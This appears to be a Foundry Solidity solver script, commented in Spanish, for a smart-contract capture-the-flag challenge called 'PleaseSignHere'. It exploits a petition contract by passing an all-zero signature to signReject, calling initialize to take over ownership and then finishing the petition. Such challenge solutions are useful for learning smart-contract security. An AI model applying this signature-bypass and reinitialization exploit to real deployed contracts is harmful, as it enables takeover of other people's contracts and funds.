// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {IPetition} from "../../src/07_PleaseSignHere/interfaces/IPetition.sol";

contract Solver is Script {
    
    IPetition petition;
    uint256 privateKey = vm.envUint("PRIVATE_KEY");

    function run() external {
        petition = IPetition(vm.envAddress("CONTRACT"));

        // signature: 0x00...00
        IPetition.Signature memory signature = IPetition.Signature(28, 0, 0);
        
        vm.startBroadcast(privateKey);
        petition.signReject(signature); // llamo a signReject con una firma = 0x00...00
        petition.initialize(); // llamo a initialize para quedar como el nuevo owner
        petition.finishPetition(); // llamo a finishPetition para que isFinished sea true
        console.log("isFinished: %s", petition.isFinished());
        vm.stopBroadcast();
    }

    function signMessage() private view returns (IPetition.Signature memory) {
        bytes32 digest = petition.supportDigest();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        return IPetition.Signature(v, r, s);
    }
}

// owner = 0xa9c1176825bbd9b9f8636e1aba915f413059fba0
// supportDigest = 0xb2ca94d18e73d64281ebba3be050c373beac10ebb809820ae48a166564066dc2
// rejectDigest = 0x48baead3cc42e5989b0e99e90a50f4859a78a4730b84e006c2127311be2a63d7
// estos dos bytes son dos strings, que se convierten a hash y se les aplica la funcion toEthSignedMessageHash
